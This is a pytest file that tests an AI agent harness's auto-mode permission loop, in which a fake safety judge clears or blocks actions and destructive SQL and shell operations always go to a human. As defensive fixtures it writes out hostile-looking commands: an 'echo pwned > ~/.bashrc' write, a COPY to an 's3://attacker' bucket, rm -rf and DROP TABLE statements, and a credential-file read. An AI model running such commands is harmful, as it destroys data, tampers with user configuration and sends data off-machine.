"""Auto-mode grounding at the runtime permission loop.

A FakeAdapter feeds subject-bearing permission requests; an injected fake
``SafetyJudge`` stands in for the metered gateway call. Pins: the write middle is
judged (allow → runs, block → rejected), the floor never reaches the judge (it
prompts the human), reads skip the judge, and a judge that can't run (gateway
error) stops the turn instead of silently allowing.
"""

from __future__ import annotations

import asyncio
from pathlib import Path
from typing import Any

import pytest
from _adapter_factory import FakeAdapterFactory
from alkera_cli.contracts.tool_types import ActionDescriptor, Effect, ResourceRef
from alkera_cli.gateway.client import GatewayUnavailableError
from alkera_cli.harness._fake import FakeAdapter
from alkera_cli.harness.permission_broker import PermissionBroker
from alkera_cli.harness.runtime import HarnessRuntime
from alkera_cli.harness.safety_judge import JudgeVerdict
from alkera_cli.plugins.plugin_base.permissions import (
    CREDENTIAL_PATH_GATE_ENV,
    classify_command,
)
from alkera_cli.plugins.plugin_base.permissions.resolve import DecisionEngine
from alkera_core.project.directory import ProjectDirectory
from alkera_core.schemas.chat import PermissionOption, PermissionRequest

_T = "2026-06-11T00:00:00Z"


class _FakeJudge:
    def __init__(
        self, verdict: JudgeVerdict | None = None, *, raises: Exception | None = None
    ) -> None:
        self.verdict = verdict or JudgeVerdict("allow", reason="ok")
        self.raises = raises
        # (descriptor, task_goal, workspace_root) — index 1 stays the
        # task goal so existing assertions on calls[i][1] keep working.
        self.calls: list[tuple[ActionDescriptor, str, str | None]] = []

    async def judge(
        self,
        descriptor: ActionDescriptor,
        task_goal: str,
        *,
        workspace_root: str | None = None,
    ) -> JudgeVerdict:
        self.calls.append((descriptor, task_goal, workspace_root))
        if self.raises is not None:
            raise self.raises
        return self.verdict


def _factory() -> FakeAdapterFactory:
    return FakeAdapterFactory(lambda: FakeAdapter(reply_text="done"), available=True)


def _bash_request(command: str, rid: str) -> PermissionRequest:
    return PermissionRequest(
        event_id=rid,
        time=_T,  # type: ignore[arg-type]
        session_id="s",
        request_id=rid,
        permission_kind="bash",
        canonical_kind="shell",
        subject=classify_command(command).model_dump(mode="json"),
        options=[PermissionOption(option_id="allow_once", name="Allow once")],
    )


async def _run(tmp_path: Path, judge: object | None, command: str):  # type: ignore[no-untyped-def]
    factory = _factory()
    rt = HarnessRuntime(
        ProjectDirectory(tmp_path / ".alkera"), adapter_factory=factory, safety_judge=judge
    )  # type: ignore[arg-type]

    async def _resolver(req: object) -> str:
        return "allow_once"  # the human would allow — proves we did NOT prompt

    broker = PermissionBroker(_resolver, default_timeout_seconds=1.0)
    session = await rt.open_chat(create=True, harness_type="agent", permission_broker=broker)
    session.set_permission_mode("auto")
    session._last_user_text = "do the task"
    adapter = factory.adapters[0]
    await adapter.feed(_bash_request(command, "r1"))
    for _ in range(150):
        if any(rr == "r1" for rr, _ in adapter.permission_replies):
            break
        await asyncio.sleep(0.02)
    return rt, session, adapter


async def test_auto_write_middle_allowed_by_judge(tmp_path: Path) -> None:
    judge = _FakeJudge(JudgeVerdict("allow", reason="normal"))
    rt, session, adapter = await _run(tmp_path, judge, "touch x")
    try:
        assert ("r1", "allow_once") in adapter.permission_replies
        assert len(judge.calls) == 1  # the judge WAS consulted
        assert judge.calls[0][1] == "do the task"  # task goal threaded
        # an ALLOW must NOT leak a reason to the model (reasons are deny-only)
        assert ("r1", None) in adapter.permission_reply_reasons
    finally:
        await rt.close_chat(session.session_id)


async def test_auto_write_middle_blocked_by_judge(tmp_path: Path) -> None:
    # A block rejects the action with the JUDGE'S reason as the denial message —
    # the model sees WHY (not a generic "user rejected") and the turn continues.
    judge = _FakeJudge(JudgeVerdict("block", reason="exfiltrates secrets"))
    rt, session, adapter = await _run(tmp_path, judge, "touch x")
    try:
        assert ("r1", "reject_once") in adapter.permission_replies
        # The judge's reason is preserved (as the detail) inside the provenance-aware
        # message — the model is told it's the auto-mode safety check + why.
        reason = next(r for rid, r in adapter.permission_reply_reasons if rid == "r1")
        assert reason and "exfiltrates secrets" in reason and "safety check" in reason
        assert adapter.cancel_count == 0  # the turn was NOT stopped
    finally:
        await rt.close_chat(session.session_id)


async def test_auto_unknown_confidence_write_goes_to_judge(tmp_path: Path) -> None:
    # An ambiguous write (python3 / an unrecognized script → confidence=unknown)
    # the deterministic policy would PROMPT on must, in auto mode, go to the JUDGE
    # — not interrupt the human. The judge clears it.
    judge = _FakeJudge(JudgeVerdict("allow", reason="ordinary build step"))
    rt, session, adapter = await _run(tmp_path, judge, "python3 build.py --release")
    try:
        assert len(judge.calls) == 1, "the unknown-confidence write was not judged"
        assert ("r1", "allow_once") in adapter.permission_replies
    finally:
        await rt.close_chat(session.session_id)


async def test_auto_unknown_confidence_write_blocked_by_judge(tmp_path: Path) -> None:
    judge = _FakeJudge(JudgeVerdict("block", reason="pipes a remote payload into the shell"))
    rt, session, adapter = await _run(tmp_path, judge, "./suspicious.sh")
    try:
        assert len(judge.calls) == 1
        assert ("r1", "reject_once") in adapter.permission_replies
        # the judge's reason rides the denial back to the model (inside the message)
        reason = next(r for rid, r in adapter.permission_reply_reasons if rid == "r1")
        assert reason and "pipes a remote payload into the shell" in reason
        assert adapter.cancel_count == 0  # the turn continues; the model adapts
    finally:
        await rt.close_chat(session.session_id)


async def test_auto_floor_never_reaches_judge(tmp_path: Path) -> None:
    # rm -rf is destroy/floor → it prompts the human (our resolver allows), and
    # the judge is NEVER called (the floor is unwaivable, not judge-able).
    judge = _FakeJudge()
    rt, session, adapter = await _run(tmp_path, judge, "rm -rf /tmp/x")
    try:
        assert ("r1", "allow_once") in adapter.permission_replies  # via the human broker
        assert judge.calls == []
    finally:
        await rt.close_chat(session.session_id)


# ---------------------------------------------------------------------------
# THE HARD RULE (no exceptions in auto): a DESTROY or a floor-op (privilege
# escalation / mass mutation) is ALWAYS resolved by a human and is NEVER handed to
# the judge -- proven at the single chokepoint (DecisionEngine) every bash/SQL/tool
# path funnels through, so even the most lenient judge cannot waive it. (EGRESS is
# the deliberate exception: in auto it IS judged — see the egress tests below.)
# ---------------------------------------------------------------------------


class _SpyJudge:
    """Records every ``judge()`` call so a test can prove the judge was (never)
    consulted. Defaults to ALLOW so that, if it were ever wrongly called for a
    destroy, the action would be (wrongly) allowed and the assertion would fail."""

    def __init__(self, verdict: JudgeVerdict | None = None) -> None:
        self.verdict = verdict or JudgeVerdict("allow", reason="ok")
        self.calls: list[ActionDescriptor] = []

    async def judge(
        self,
        descriptor: ActionDescriptor,
        task_goal: str,
        *,
        workspace_root: str | None = None,
    ) -> JudgeVerdict:
        self.calls.append(descriptor)
        return self.verdict


class _SpyBroker:
    """A human-broker stand-in that records that it was consulted."""

    def __init__(self, reply: str = "reject_once") -> None:
        self.reply = reply
        self.calls = 0

    async def resolve(self, req: object) -> str:
        self.calls += 1
        return self.reply


class _MemorySink:
    """The engine's mandatory decisions log, kept in memory. The log's own contract
    is ``test_permissions_audit.py``'s subject."""

    def __init__(self) -> None:
        self.records: list[object] = []

    def record(self, rec: object) -> None:
        self.records.append(rec)


async def _resolve(descriptor: ActionDescriptor, *, broker: object, judge: object, goal: str):  # type: ignore[no-untyped-def]
    """One action through the engine every bash, SQL, and tool path funnels into."""
    engine = DecisionEngine(
        sink=_MemorySink(),
        broker=broker,  # type: ignore[arg-type]
        judge=judge,  # type: ignore[arg-type]
        workspace_root="/ws",
    )
    return await engine.resolve(descriptor, mode="auto", task_goal=goal)


def _sql_descriptor(
    effect: Effect, operation: str, raw: str, *, kind: str, name: str
) -> ActionDescriptor:
    return ActionDescriptor(
        capability="sql",
        effect=effect,
        operation=operation,
        raw=raw,
        targets=[ResourceRef(kind=kind, name=name)],
        classifier="test",
    )


@pytest.mark.parametrize(
    "descriptor",
    [
        pytest.param(classify_command("rm -rf /tmp/x"), id="bash-rm-rf-outside"),
        # even a recoverable-looking, in-workspace destroy still goes to the human:
        pytest.param(classify_command("rm -rf build"), id="bash-rm-workspace-dir"),
        pytest.param(classify_command("git reset --hard"), id="bash-git-reset-hard"),
        pytest.param(
            _sql_descriptor(Effect.DESTROY, "drop_table", "DROP TABLE t", kind="table", name="t"),
            id="sql-drop-table",
        ),
        pytest.param(
            _sql_descriptor(Effect.DESTROY, "truncate", "TRUNCATE t", kind="table", name="t"),
            id="sql-truncate",
        ),
        pytest.param(
            _sql_descriptor(
                Effect.DESTROY, "drop_schema", "DROP SCHEMA s", kind="schema", name="s"
            ),
            id="sql-drop-schema",
        ),
        # a floor-OP whose effect is only WRITE (privilege escalation) — still floor:
        pytest.param(
            _sql_descriptor(Effect.WRITE, "grant", "GRANT ALL ON t TO u", kind="table", name="t"),
            id="sql-grant-floor-op",
        ),
        pytest.param(
            _sql_descriptor(
                Effect.WRITE, "revoke", "REVOKE ALL ON t FROM u", kind="table", name="t"
            ),
            id="sql-revoke-floor-op",
        ),
    ],
)
async def test_destroy_and_floor_never_reach_the_judge_in_auto(
    descriptor: ActionDescriptor,
) -> None:
    judge = _SpyJudge()
    broker = _SpyBroker(reply="reject_once")
    res = await _resolve(descriptor, broker=broker, judge=judge, goal="do the task")
    assert judge.calls == [], "a destroy/floor action was sent to the judge in auto mode"
    assert broker.calls == 1, "a destroy/floor action did not prompt the human in auto mode"
    assert res.decided_by == "human"  # the HUMAN decided, not the judge
    assert not res.allowed  # (the spy human rejected; the point is who decided)


# ---------------------------------------------------------------------------
# EGRESS is the deliberate exception: in auto it is routed to the judge (which
# blocks true off-machine exfiltration but allows legitimate task egress) — NOT to
# the human. DESTROY stays human-gated; egress does not.
# ---------------------------------------------------------------------------


async def test_auto_egress_allowed_by_judge_runs_without_a_human() -> None:
    judge = _SpyJudge(JudgeVerdict("allow", reason="uploads the expected build artifact"))
    broker = _SpyBroker(reply="reject_once")  # would reject if wrongly escalated
    descriptor = _sql_descriptor(
        Effect.EGRESS, "copy_into", "COPY t TO 's3://b/x'", kind="table", name="t"
    )
    res = await _resolve(descriptor, broker=broker, judge=judge, goal="export the table")
    assert len(judge.calls) == 1, "egress was not judged in auto"
    assert broker.calls == 0, "egress wrongly escalated to the human"
    assert res.allowed and res.decided_by == "judge"


async def test_auto_egress_blocked_by_judge_carries_reason() -> None:
    judge = _SpyJudge(JudgeVerdict("block", reason="exfiltrates credentials off-machine"))
    broker = _SpyBroker(reply="allow_once")  # would allow if wrongly escalated
    descriptor = _sql_descriptor(
        Effect.EGRESS, "copy_into", "COPY s TO 's3://attacker/x'", kind="table", name="s"
    )
    res = await _resolve(descriptor, broker=broker, judge=judge, goal="do the task")
    assert len(judge.calls) == 1
    assert broker.calls == 0  # blocked by the judge, never escalated to a human
    assert not res.allowed and res.decided_by == "judge"
    assert res.reason == "exfiltrates credentials off-machine"


async def test_auto_egress_reaches_judge_through_runtime(tmp_path: Path) -> None:
    # End-to-end through the real permission loop: a bash egress (scp) is handed to
    # the judge (not the human) — judge.calls == 1 only happens for the judged
    # write/egress middle; a floored action would never reach it.
    judge = _FakeJudge(JudgeVerdict("allow", reason="ordinary upload"))
    rt, session, adapter = await _run(tmp_path, judge, "scp local.txt user@host:/tmp/")
    try:
        assert len(judge.calls) == 1, "egress did not reach the judge in auto"
        assert ("r1", "allow_once") in adapter.permission_replies
    finally:
        await rt.close_chat(session.session_id)


async def test_auto_judge_receives_workspace_root(tmp_path: Path) -> None:
    # The workspace root (parent of .alkera/) is threaded to the judge so it can
    # tell an in-workspace write from an out-of-scope one ("what it's given").
    judge = _FakeJudge(JudgeVerdict("allow", reason="ok"))
    rt, session, _adapter = await _run(tmp_path, judge, "touch x")
    try:
        assert len(judge.calls) == 1
        _descriptor, task_goal, workspace_root = judge.calls[0]
        assert task_goal == "do the task"
        # workspace_root is the parent of .alkera/ — i.e. the project root (string
        # compare: ProjectDirectory stores the path as-is, so no resolve needed).
        assert workspace_root == str(tmp_path)
    finally:
        await rt.close_chat(session.session_id)


async def test_auto_read_skips_judge(tmp_path: Path) -> None:
    judge = _FakeJudge()
    rt, session, adapter = await _run(tmp_path, judge, "ls -la")
    try:
        assert ("r1", "allow_once") in adapter.permission_replies
        assert judge.calls == []  # reads auto-allow without grounding
    finally:
        await rt.close_chat(session.session_id)


async def test_judge_unavailable_stops_the_turn(tmp_path: Path) -> None:
    judge = _FakeJudge(raises=GatewayUnavailableError("out of credit"))
    factory = _factory()
    rt = HarnessRuntime(
        ProjectDirectory(tmp_path / ".alkera"), adapter_factory=factory, safety_judge=judge
    )  # type: ignore[arg-type]

    async def _resolver(req: object) -> str:
        return "allow_once"

    broker = PermissionBroker(_resolver, default_timeout_seconds=1.0)
    session = await rt.open_chat(create=True, harness_type="agent", permission_broker=broker)
    session.set_permission_mode("auto")
    adapter = factory.adapters[0]
    sub = session.subscribe()
    try:
        await adapter.feed(_bash_request("touch x", "r1"))
        for _ in range(150):
            if ("r1", "reject_once") in adapter.permission_replies and adapter.cancel_count >= 1:
                break
            await asyncio.sleep(0.02)
        # the action is rejected AND the turn is cancelled + an error surfaced
        assert ("r1", "reject_once") in adapter.permission_replies
        assert adapter.cancel_count >= 1
        del sub
    finally:
        await rt.close_chat(session.session_id)


async def test_unexpected_judge_error_also_stops_the_turn(tmp_path: Path) -> None:
    # A non-gateway exception means the judge is BROKEN — stop the turn rather than
    # reject-and-continue (which would make the model retry into the same error).
    judge = _FakeJudge(raises=RuntimeError("boom"))
    rt, session, adapter = await _run(tmp_path, judge, "touch x")
    try:
        assert ("r1", "reject_once") in adapter.permission_replies
        assert adapter.cancel_count >= 1  # the turn was stopped
    finally:
        await rt.close_chat(session.session_id)


async def test_no_judge_falls_back_to_the_human_prompt(tmp_path: Path) -> None:
    # With no judge injected (an unauthenticated session — production always
    # builds one from the gateway catalog), auto mode must NOT allow the write
    # middle ungrounded: it prompts the human, exactly like default mode.
    prompted: list[str] = []
    factory = _factory()
    rt = HarnessRuntime(
        ProjectDirectory(tmp_path / ".alkera"), adapter_factory=factory, safety_judge=None
    )

    async def _resolver(req: PermissionRequest) -> str:
        prompted.append(req.request_id)
        return "allow_once"

    broker = PermissionBroker(_resolver, default_timeout_seconds=1.0)
    session = await rt.open_chat(create=True, harness_type="agent", permission_broker=broker)
    session.set_permission_mode("auto")
    adapter = factory.adapters[0]
    await adapter.feed(_bash_request("touch x", "r1"))
    for _ in range(150):
        if ("r1", "allow_once") in adapter.permission_replies:
            break
        await asyncio.sleep(0.02)
    try:
        assert prompted == ["r1"], "a judge-less auto write was allowed ungrounded"
        assert ("r1", "allow_once") in adapter.permission_replies  # the human's answer
    finally:
        await rt.close_chat(session.session_id)


def test_clamp_always_downgrades_floor_unknown_and_all_shell() -> None:
    # opencode learns a COARSE prefix from "always allow" (`psql -c *`) that would
    # skip our gate on a later floor command — so EVERY shell command (plus any
    # floor / unknown of any capability) is clamped to "once". Our own precise
    # (capability, operation) rule is what persists the ergonomic always-allow.
    from alkera_cli.contracts.tool_types import ActionDescriptor, Effect
    from alkera_cli.plugins.plugin_base.permissions import clamp_always, classify_command

    # any shell command → once (kills opencode's coarse prefix learning)
    assert clamp_always("allow_always", classify_command("rm -rf x")) == "allow_once"  # floor
    assert clamp_always("allow_always", classify_command("mkdir scratch")) == "allow_once"  # write
    assert clamp_always("allow_always", classify_command("git push origin x")) == "allow_once"

    # a non-shell floor is still clamped
    egress = ActionDescriptor(capability="sql", effect=Effect.EGRESS, operation="copy")
    assert clamp_always("allow_always", egress) == "allow_once"

    # a non-shell recoverable write (an fs edit) CAN persist as opencode "always"
    fs_write = ActionDescriptor(capability="fs", effect=Effect.WRITE, operation="write")
    assert clamp_always("allow_always", fs_write) == "allow_always"

    # a non-"always" option is never changed
    assert clamp_always("allow_once", classify_command("rm -rf x")) == "allow_once"


async def test_runtime_loop_writes_the_audit_log(tmp_path: Path) -> None:
    # The runtime permission loop records every decision to the PER-CHAT
    # decisions.jsonl (next to the chat history) — including the judge verdict
    # (decided_by="judge") that produces no chat event.
    judge = _FakeJudge(JudgeVerdict("block", reason="off task"))
    rt, session, _adapter = await _run(tmp_path, judge, "touch x")
    try:
        for _ in range(150):
            if session.decision_sink.read():
                break
            await asyncio.sleep(0.02)
        # the log lives in the chat dir, not the project root
        assert (session.chat_path / "decisions.jsonl").exists()
        records = session.decision_sink.read()
        assert records, "no decision recorded"
        rec = records[-1]
        assert rec.decision == "reject"
        assert rec.decided_by == "judge"
        assert "off task" in rec.reasons
    finally:
        await rt.close_chat(session.session_id)


# ---------------------------------------------------------------------------
# Auto-mode MULTI-STEP end-to-end through the real runtime permission loop.
# This is the harness that would have caught "auto prompts on an unknown write":
# it drives a realistic sequence and asserts which steps run silently, which the
# judge clears, which the floor sends to the human, and which the judge blocks.
# ---------------------------------------------------------------------------


class _PredicateJudge:
    """Allows everything EXCEPT a command whose raw text matches ``danger`` —
    a stand-in for the real lenient judge (allow ordinary work, block the
    genuinely dangerous), so the test exercises both verdicts in one run."""

    def __init__(self, danger: str) -> None:
        self._danger = danger
        self.calls: list[str] = []

    async def judge(
        self,
        descriptor: ActionDescriptor,
        task_goal: str,
        *,
        workspace_root: str | None = None,
    ) -> JudgeVerdict:
        raw = descriptor.raw or ""
        self.calls.append(raw)
        if self._danger in raw:
            return JudgeVerdict("block", reason=f"writes to a protected target ({self._danger})")
        return JudgeVerdict("allow", reason="ordinary build step")


async def test_auto_mode_multistep_sequence(tmp_path: Path) -> None:
    judge = _PredicateJudge(danger=".bashrc")
    factory = _factory()
    rt = HarnessRuntime(
        ProjectDirectory(tmp_path / ".alkera"), adapter_factory=factory, safety_judge=judge
    )  # type: ignore[arg-type]

    human_prompts: list[str] = []

    async def _resolver(req: PermissionRequest) -> str:
        human_prompts.append(req.request_id)  # only a genuine PROMPT reaches here
        return "allow_once"

    broker = PermissionBroker(_resolver, default_timeout_seconds=1.0)
    session = await rt.open_chat(create=True, harness_type="agent", permission_broker=broker)
    session.set_permission_mode("auto")
    session._last_user_text = "build the project"
    adapter = factory.adapters[0]

    # The scripted turn: a known write, an UNKNOWN-confidence write, a destroy
    # (floor), and a dangerous write — each must take a different path.
    steps = [
        ("r1", "mkdir -p build"),  # write/exact   → judge → allow
        ("r2", "python3 setup.py build"),  # write/unknown → judge → allow (NOT a human prompt)
        ("r3", "rm -rf build"),  # destroy/floor → HUMAN prompt (judge NOT called)
        ("r4", "echo pwned > ~/.bashrc"),  # dangerous write → judge → BLOCK + reason
    ]
    for rid, cmd in steps:
        await adapter.feed(_bash_request(cmd, rid))
        for _ in range(150):
            if any(rr == rid for rr, _ in adapter.permission_replies):
                break
            await asyncio.sleep(0.02)
    try:
        replies = dict(adapter.permission_replies)
        reasons = dict(adapter.permission_reply_reasons)

        # r1, r2: judged and allowed — NO human prompt for either.
        assert replies["r1"] == "allow_once"
        assert replies["r2"] == "allow_once"
        assert "r1" not in human_prompts and "r2" not in human_prompts
        # the unknown-confidence write WAS judged (the exact bug from the smoke test)
        assert any("python3 setup.py" in c for c in judge.calls)

        # r3: destroy is the floor → it went to the HUMAN, the judge never saw it.
        assert "r3" in human_prompts
        assert not any("rm -rf" in c for c in judge.calls)
        assert replies["r3"] == "allow_once"  # the human allowed it

        # r4: dangerous write → judge BLOCK, rejected, reason carried to the model,
        # and the turn did NOT end (no human prompt, adapter not cancelled).
        assert replies["r4"] == "reject_once"
        assert reasons["r4"] and ".bashrc" in reasons["r4"]
        assert "r4" not in human_prompts
        assert adapter.cancel_count == 0
    finally:
        await rt.close_chat(session.session_id)


# ---------------------------------------------------------------------------
# NON-bash subjects through the real auto-mode loop — the external_directory bug
# lived here: a fs/network/external descriptor must be JUDGED in auto, not
# prompted. (Previously only _bash_request was exercised end to end.)
# ---------------------------------------------------------------------------


def _oc_request(kind: str, patterns: list[str], rid: str) -> PermissionRequest:
    from alkera_cli.harness.adapters.opencode_translate import (
        _descriptor_for_opencode,
        _opencode_kind_to_canonical,
    )

    d = _descriptor_for_opencode(kind, patterns)
    return PermissionRequest(
        event_id=rid,
        time=_T,  # type: ignore[arg-type]
        session_id="s",
        request_id=rid,
        permission_kind=kind,
        canonical_kind=_opencode_kind_to_canonical(kind),
        subject=d.model_dump(mode="json") if d is not None else None,
        options=[PermissionOption(option_id="allow_once", name="Allow once")],
    )


async def _run_oc(
    tmp_path: Path, judge: object, kind: str, patterns: list[str], *, before_feed: Any = None
):  # type: ignore[no-untyped-def]
    factory = _factory()
    rt = HarnessRuntime(
        ProjectDirectory(tmp_path / ".alkera"), adapter_factory=factory, safety_judge=judge
    )  # type: ignore[arg-type]
    prompted: list[object] = []  # the cards the human was actually shown

    async def _resolver(req: object) -> str:
        prompted.append(req)
        return "allow_once"

    broker = PermissionBroker(_resolver, default_timeout_seconds=1.0)
    session = await rt.open_chat(create=True, harness_type="agent", permission_broker=broker)
    session.set_permission_mode("auto")
    session._last_user_text = "do the task"
    if before_feed is not None:
        await before_feed(session)
    adapter = factory.adapters[0]
    await adapter.feed(_oc_request(kind, patterns, "r1"))
    for _ in range(150):
        if any(rr == "r1" for rr, _ in adapter.permission_replies):
            break
        await asyncio.sleep(0.02)
    return rt, session, adapter, prompted


async def test_auto_external_directory_is_judged_not_prompted(tmp_path: Path) -> None:
    # THE regression for the reported bug: external_directory (write outside cwd)
    # in auto goes to the JUDGE, NOT the human broker.
    judge = _FakeJudge(JudgeVerdict("allow", reason="ordinary scratch dir"))
    rt, session, adapter, prompted = await _run_oc(
        tmp_path, judge, "external_directory", ["/tmp/*"]
    )
    try:
        assert len(judge.calls) == 1, "external_directory was not judged in auto"
        assert prompted == [], "external_directory wrongly prompted the human in auto"
        assert ("r1", "allow_once") in adapter.permission_replies
    finally:
        await rt.close_chat(session.session_id)


async def test_auto_fs_edit_is_judged_not_prompted(tmp_path: Path) -> None:
    judge = _FakeJudge(JudgeVerdict("allow", reason="ordinary edit"))
    rt, session, _adapter, prompted = await _run_oc(tmp_path, judge, "edit", ["src/main.py"])
    try:
        assert len(judge.calls) == 1
        assert prompted == []
    finally:
        await rt.close_chat(session.session_id)


async def test_auto_read_kind_auto_allows_without_judge(tmp_path: Path) -> None:
    judge = _FakeJudge()
    rt, session, adapter, prompted = await _run_oc(tmp_path, judge, "read", ["src/main.py"])
    try:
        assert judge.calls == [], "a read kind must not burn a judge call"
        assert prompted == []
        assert ("r1", "allow_once") in adapter.permission_replies
    finally:
        await rt.close_chat(session.session_id)


async def test_auto_webfetch_is_judged_not_auto_allowed(tmp_path: Path) -> None:
    """An outbound fetch is EGRESS, not a read: the URL is a channel out of the
    machine, so `auto` must ground it with the safety judge rather than let it
    through unseen."""
    judge = _FakeJudge(JudgeVerdict("allow", reason="public docs page"))
    rt, session, adapter, prompted = await _run_oc(
        tmp_path, judge, "webfetch", ["https://example.com/docs"]
    )
    try:
        assert len(judge.calls) == 1, "webfetch was not judged in auto"
        assert prompted == []
        assert ("r1", "allow_once") in adapter.permission_replies
    finally:
        await rt.close_chat(session.session_id)


async def test_auto_read_of_a_credential_path_is_judged(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """With the credential-path gate switched on (it is off by default) the
    exfiltration floor reaches the fs lane too: reading the gateway JWT is not an
    ordinary read, so it can't slip past the judge in auto."""
    monkeypatch.setenv(CREDENTIAL_PATH_GATE_ENV, "1")
    judge = _FakeJudge(JudgeVerdict("block", reason="reads the Alkera bearer token"))
    rt, session, adapter, prompted = await _run_oc(
        tmp_path, judge, "read", ["/Users/someone/.alkera/auth.yml"]
    )
    try:
        assert len(judge.calls) == 1, "a credential read was not judged in auto"
        assert ("r1", "reject_once") in adapter.permission_replies
        assert prompted == []
    finally:
        await rt.close_chat(session.session_id)


async def test_auto_external_directory_blocked_carries_reason(tmp_path: Path) -> None:
    judge = _FakeJudge(
        JudgeVerdict("block", reason="writes outside the workspace to a system path")
    )
    rt, session, adapter, prompted = await _run_oc(
        tmp_path, judge, "external_directory", ["/etc/*"]
    )
    try:
        assert ("r1", "reject_once") in adapter.permission_replies
        reason = next(r for rid, r in adapter.permission_reply_reasons if rid == "r1")
        assert reason and "writes outside the workspace to a system path" in reason
        assert prompted == []
    finally:
        await rt.close_chat(session.session_id)
